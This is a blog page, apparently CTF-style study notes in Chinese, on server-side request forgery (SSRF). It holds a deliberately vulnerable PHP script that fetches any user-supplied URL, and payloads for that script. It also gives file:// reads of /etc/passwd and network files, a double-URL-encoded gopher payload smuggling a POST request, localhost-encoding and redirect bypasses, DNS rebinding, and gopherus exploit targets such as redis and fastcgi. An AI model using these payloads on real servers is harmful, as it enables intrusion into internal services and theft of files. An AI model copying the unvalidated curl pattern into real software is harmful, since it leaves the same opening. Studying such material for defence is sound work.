@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang='en' dir='auto'><head>
+  <meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'>
+<meta name='description' content='SSRF example
+# index.php &lt;?php highlight_file(__FILE__); function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo $result; } $url = $_GET[&#39;url&#39;]; curl($url); # ssrf.php &lt;?php $ip = $_SERVER[&#34;REMOTE_ADDR&#34;]; if($ip === &#34;127.0.0.1&#34;){ if($_GET[&#34;passwd&#34;] === &#34;adminTrue&#34;){ readfile(&#34;/flag&#34;); } else{ echo &#34;no&#34;; } }else{ echo &#34;not 127.0.0.1&#34;; } payload
+?url=http://127.0.0.1/ssrf.php?passwd=adminTrue... 利用协议 file://dict://gopher://ftp://sftp://ldap://tftp://... file://
+file://file:///etc/passwdfile:///etc/hostsfile:///proc/net/arpfile:///proc/net/fib_trie.'>
+<meta name='theme-color' content='#00ffff'>
+
+<meta property='og:title' content='SSRF • '>
+<meta property='og:description' content='SSRF example
+# index.php &lt;?php highlight_file(__FILE__); function curl($url){ $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, 1); $result=curl_exec($ch); curl_close($ch); echo $result; } $url = $_GET[&#39;url&#39;]; curl($url); # ssrf.php &lt;?php $ip = $_SERVER[&#34;REMOTE_ADDR&#34;]; if($ip === &#34;127.0.0.1&#34;){ if($_GET[&#34;passwd&#34;] === &#34;adminTrue&#34;){ readfile(&#34;/flag&#34;); } else{ echo &#34;no&#34;; } }else{ echo &#34;not 127.0.0.1&#34;; } payload
+?url=http://127.0.0.1/ssrf.php?passwd=adminTrue... 利用协议 file://dict://gopher://ftp://sftp://ldap://tftp://... file://
+file://file:///etc/passwdfile:///etc/hostsfile:///proc/net/arpfile:///proc/net/fib_trie.'>
+<meta property='og:url' content='https://n2ryx.github.io/docs/ssrf/ssrf/'>
+<meta property='og:site_name' content='n2ryx&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='docs'><meta property='article:tag' content='SSRF'><meta property='article:published_time' content='2024-01-29T00:00:00Z'/><meta property='article:modified_time' content='2024-01-29T00:00:00Z'/><meta name='twitter:card' content='summary'>
+
+<meta name="generator" content="Hugo 0.126.1">
+
+  <title>SSRF • </title>
+  <link rel='canonical' href='https://n2ryx.github.io/docs/ssrf/ssrf/'>
+  
+  
+  <link rel='icon' href='/favicon.ico'>
+<link rel='stylesheet' href='/assets/css/main.ab98e12b.css'><link rel='stylesheet' href='/css/custom.css'><style>
+:root{--color-accent:#00ffff;}
+</style>
+
+  
+
+
+  
+
+</head>
+<body class='page type-docs has-sidebar'>
+
+  <div class='site'><div id='sidebar' class='sidebar'>
+  <a class='screen-reader-text' href='#main-menu'>Skip to Main Menu</a>
+
+  <div class='container'><section class='widget widget-about sep-after'>
+  <header>
+    
+    <div class='logo'>
+      <a href='/'>
+        <img src='/images/logo.png'>
+      </a>
+    </div>
+    
+    <h2 class='title site-title '>
+      <a href='/'>
+      n2ryx&#39;s Blog
+      </a>
+    </h2>
+    <div class='desc'>
+    
+    </div>
+  </header>
+
+</section>
+<section class='widget widget-search sep-after'>
+  <header>
+    <h4 class='title widget-title'>Search</h4>
+  </header>
+
+  <form action='/search' id='search-form' class='search-form'>
+    <label>
+      <span class='screen-reader-text'>Search</span>
+      <input id='search-term' class='search-term' type='search' name='q' placeholder='Search&hellip;'>
+    </label></form>
+
+</section>
+<section class='widget widget-sidebar_menu sep-after'><nav id='sidebar-menu' class='menu sidebar-menu' aria-label='Sidebar Menu'>
+    <div class='container'>
+      <ul><li class='item'>
+  <a href='/'>主页</a></li><li class='item has-current'>
+  <a href='/docs/'>文档</a></li><li class='item'>
+  <a href='/archive/'>归档</a></li><li class='item'>
+  <a href='/about/'>关于</a></li></ul>
+    </div>
+  </nav>
+
+</section><section class='widget widget-taxonomy_cloud sep-after'>
+  <header>
+    <h4 class='title widget-title'>Tags</h4>
+  </header>
+
+  <div class='container list-container'>
+  <ul class='list taxonomy-cloud'><li>
+        <a href='/tags/java/' style='font-size:2em'>Java</a>
+      </li><li>
+        <a href='/tags/pentest/' style='font-size:1.0909090909090908em'>Pentest</a>
+      </li><li>
+        <a href='/tags/pollution/' style='font-size:1.1818181818181819em'>Pollution</a>
+      </li><li>
+        <a href='/tags/ssrf/' style='font-size:1em'>SSRF</a>
+      </li><li>
+        <a href='/tags/vul/' style='font-size:1.1818181818181819em'>Vul</a>
+      </li><li>
+        <a href='/tags/writeup/' style='font-size:1.0909090909090908em'>Writeup</a>
+      </li></ul>
+</div>
+
+
+</section>
+</div>
+
+  <div class='sidebar-overlay'></div>
+</div><div class='main'><a class='screen-reader-text' href='#content'>Skip to Content</a>
+
+<button id='sidebar-toggler' class='sidebar-toggler' aria-controls='sidebar'>
+  <span class='screen-reader-text'>Toggle Sidebar</span>
+  <span class='open'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="3" y1="12" x2="21" y2="12" />
+<line x1="3" y1="6" x2="21" y2="6" />
+<line x1="3" y1="18" x2="21" y2="18" />
+</svg>
+</span>
+  <span class='close'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="18" y1="6" x2="6" y2="18" />
+<line x1="6" y1="6" x2="18" y2="18" />
+</svg>
+</span>
+</button><div class='header-widgets'>
+        <div class='container'>
+    
+    <style>.widget-breadcrumbs li:after{content:'\2f '}</style>
+  <section class='widget widget-breadcrumbs sep-after'>
+    <nav id='breadcrumbs'>
+      <ol><li><a href='/'>主页</a></li><li><a href='/docs/'>文档</a></li><li><span>SSRF</span></li></ol>
+    </nav>
+  </section></div>
+      </div>
+
+      <header id='header' class='header site-header'>
+        <div class='container sep-after'>
+          <div class='header-info'><p class='site-title title'>n2ryx&#39;s Blog</p><p class='desc site-desc'></p>
+          </div>
+        </div>
+      </header>
+
+      <main id='content'>
+
+
+<article lang='en' class='entry'>
+  <header class='header entry-header'>
+  <div class='container sep-after'>
+    <div class='header-info'>
+      <h1 class='title'>SSRF</h1>
+      
+
+    </div>
+    <div class='entry-meta'>
+  <span class='posted-on'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><rect x="3" y="4" width="18" height="18" rx="2" ry="2" />
+<line x1="16" y1="2" x2="16" y2="6" />
+<line x1="8" y1="2" x2="8" y2="6" />
+<line x1="3" y1="10" x2="21" y2="10" />
+</svg>
+<span class='screen-reader-text'>Posted on </span>
+  <time class='entry-date' datetime='2024-01-29T00:00:00Z'>2024, Jan 29</time>
+</span>
+
+  <span class='byline'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M21,21V20c0-2.76-4-5-9-5s-9,2.24-9,5v1" />
+<path d="M16,6.37A4,4,0,1,1,12.63,3,4,4,0,0,1,16,6.37Z" />
+</svg>
+<span class='screen-reader-text'> by </span><a href='/authors/%3cnil%3e'></a></span>
+  
+
+</div>
+
+
+  </div>
+</header>
+
+  
+  
+
+  <div class='container entry-content'>
+  <h2 id="ssrf">SSRF</h2>
+<p>example</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># index.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">curl</span>($url){  
+</span></span><span style="display:flex;"><span>    $ch <span style="color:#f92672">=</span> <span style="color:#a6e22e">curl_init</span>();
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_URL</span>, $url);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($ch, <span style="color:#a6e22e">CURLOPT_HEADER</span>, <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_setopt</span>($curlobj, <span style="color:#a6e22e">CURLOPT_RETURNTRANSFER</span>, <span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>    $result<span style="color:#f92672">=</span><span style="color:#a6e22e">curl_exec</span>($ch);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">curl_close</span>($ch);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> $result;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>$url <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;url&#39;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">curl</span>($url);
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#75715e"># ssrf.php
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>$ip <span style="color:#f92672">=</span> $_SERVER[<span style="color:#e6db74">&#34;REMOTE_ADDR&#34;</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span>($ip <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;127.0.0.1&#34;</span>){
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>($_GET[<span style="color:#e6db74">&#34;passwd&#34;</span>] <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;adminTrue&#34;</span>){
+</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">readfile</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;no&#34;</span>;
+</span></span><span style="display:flex;"><span>	}
+</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;not 127.0.0.1&#34;</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>payload</p>
+<pre tabindex="0"><code>?url=http://127.0.0.1/ssrf.php?passwd=adminTrue
+...
+</code></pre><h3 id="利用协议">利用协议</h3>
+<pre tabindex="0"><code>file://
+dict://
+gopher://
+ftp://
+sftp://
+ldap://
+tftp://
+...
+</code></pre><p>file://</p>
+<pre tabindex="0"><code>file://
+file:///etc/passwd
+file:///etc/hosts
+file:///proc/net/arp
+file:///proc/net/fib_trie
+...
+</code></pre><p>dict://</p>
+<pre tabindex="0"><code># 配合Capture探测存活主机和端口
+dict://ip:port
+</code></pre><p>http://</p>
+<pre tabindex="0"><code># 配合Capture扫目录
+http://ip:&lt;port&gt;/&lt;file&gt;
+</code></pre><p>gopher://</p>
+<pre tabindex="0"><code># 默认端口 70
+gopher://ip:port/_gopher-text	# _ 是填充位（可为任意字符），不会被接收
+
+# gopher是第一台服务器解析，_ 后的数据是第二台服务器解析，所以需要双重url编码
+gopher%3A%2F%2F172.250.250.4%3A80%2F_%2550%254f%2553%2554%2520%252f%256e%2561%256d%2565%252e%2570%2568%2570%253f%256e%2561%256d%2565%253d%2571%2571%2571%2520%2548%2554%2554%2550%252f%2531%252e%2531%250d%250a%2548%256f%2573%2574%253a%2520%2531%2537%2532%252e%2532%2535%2530%252e%2532%2535%2530%252e%2534%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%2554%2579%2570%2565%253a%2520%2561%2570%2570%256c%2569%2563%2561%2574%2569%256f%256e%252f%2578%252d%2577%2577%2577%252d%2566%256f%2572%256d%252d%2575%2572%256c%2565%256e%2563%256f%2564%2565%2564%250d%250a%2543%256f%256e%2574%2565%256e%2574%252d%254c%2565%256e%2567%2574%2568%253a%2520%2531%2530%250d%250a%250d%250a%256e%2561%256d%2565%253d%256e%2532%2572%2579%2578
+
+# _ 后的数据双重url解码
+
+POST /name.php?name=qqq HTTP/1.1
+Host: 172.250.250.4
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+name=n2ryx
+</code></pre><h3 id="绕过">绕过</h3>
+<p>进制转换</p>
+<pre tabindex="0"><code># localhost 127.0.0.1
+http://0x7F.0.0.1	//16进制
+http://0177.0.0.1	//8进制
+http://2130706433	//10进制整数格式
+http://0x7F000001	16进制整数格式
+http://127.1	//省略模式
+http://127.127.127.127	//用CIDR绕过localhost
+http://0	//特殊地址0
+http://0.0.0.0
+http://[::1]	//ipv6回环地址
+</code></pre><p>302重定向</p>
+<pre tabindex="0"><code>php -S 0.0.0.0:2222
+服务下的index.php: &lt;?php header(&#39;Location: http://127.0.0.1/flag.php&#39;);
+
+payload: url=http://构造重定向的ip:2222/
+</code></pre><p>DNS重绑定</p>
+<pre tabindex="0"><code>https://lock.cmpxchg8b.com/rebinder.html
+
+http://example —&gt; 127.0.0.1
+</code></pre><p><code> # @</code></p>
+<pre tabindex="0"><code>http://www.baidu.com@www.qq.com  // 实则访问www.qq.com
+http://www.baidu.com#www.qq.com  // 实则访问www.baidu.com
+</code></pre><h3 id="gopherus">gopherus</h3>
+<p>Usage</p>
+<table>
+<thead>
+<tr>
+<th>Command</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>gopherus &ndash;help</td>
+<td>Help</td>
+</tr>
+<tr>
+<td>gopherus &ndash;exploit</td>
+<td>Arguments can be :</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit mysql</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit postgresql</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit fastcgi</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit redis</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit zabbix</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit pymemcache</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit rbmemcache</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit phpmemcache</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit dmpmemcache</td>
+</tr>
+<tr>
+<td></td>
+<td>&ndash;exploit smtp</td>
+</tr>
+</tbody>
+</table>
+<p><img alt="image-20240523173515208" src="https://cdn.jsdelivr.net/gh/n2ryx/Picture-bed@master/typora/image-20240523173515208.png"></p>
+
+</div>
+
+  
+<footer class='entry-footer'>
+  <div class='container sep-before'><div class='tags'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M20.59,13.41l-7.17,7.17a2,2,0,0,1-2.83,0L2,12V2H12l8.59,8.59A2,2,0,0,1,20.59,13.41Z" />
+<line x1="7" y1="7" x2="7" y2="7" />
+</svg>
+<span class='screen-reader-text'>Tags: </span><a class='tag' href='/tags/ssrf/'>SSRF</a></div>
+
+  </div>
+</footer>
+
+
+</article>
+
+<nav class='entry-nav'>
+  <div class='container'><div class='prev-entry sep-before'>
+      <a href='/docs/writeup/2023ciscn%E5%88%9D%E8%B5%9B%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/'>
+        <span aria-hidden='true'><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="20" y1="12" x2="4" y2="12" />
+<polyline points="10 18 4 12 10 6" />
+</svg>
+ Previous</span>
+        <span class='screen-reader-text'>Previous post: </span>2023CISCN初赛题目复现</a>
+    </div><div class='next-entry sep-before'>
+      <a href='/docs/pollution/javascript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/'>
+        <span class='screen-reader-text'>Next post: </span>JavaScript原型链污染<span aria-hidden='true'>Next <svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><line x1="4" y1="12" x2="20" y2="12" />
+<polyline points="14 6 20 12 14 18" />
+</svg>
+</span>
+      </a>
+    </div></div>
+</nav>
+
+
+
+
+      </main>
+
+      <footer id='footer' class='footer'>
+        <div class='container sep-before'><section class='widget widget-social_menu sep-after'><nav aria-label='Social Menu'>
+    <ul><li>
+        <a href='https://github.com/n2ryx' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Open Github account in new tab</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22" />
+</svg>
+</a>
+      </li><li>
+        <a href='mailto:experience_0109@163.com' target='_blank' rel='noopener me'>
+          <span class='screen-reader-text'>Contact via Email</span><svg
+  class="icon"
+  xmlns="http://www.w3.org/2000/svg"
+  viewbox="0 0 24 24"
+  stroke-linecap="round"
+  stroke-linejoin="round"
+  stroke-width="2"
+  aria-hidden="true"
+><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z" />
+<polyline points="22,6 12,13 2,6" />
+</svg>
+</a>
+      </li></ul>
+  </nav>
+</section><div class='copyright'>
+  <p></p>
+</div>
+
+        </div>
+      </footer>
+
+    </div>
+  </div><script>window.__assets_js_src="/assets/js/"</script>
+
+<script src='/assets/js/main.c3bcf2df.js'></script><script src='/js/custom.js'></script>
+
+</body>
+
+</html>
+
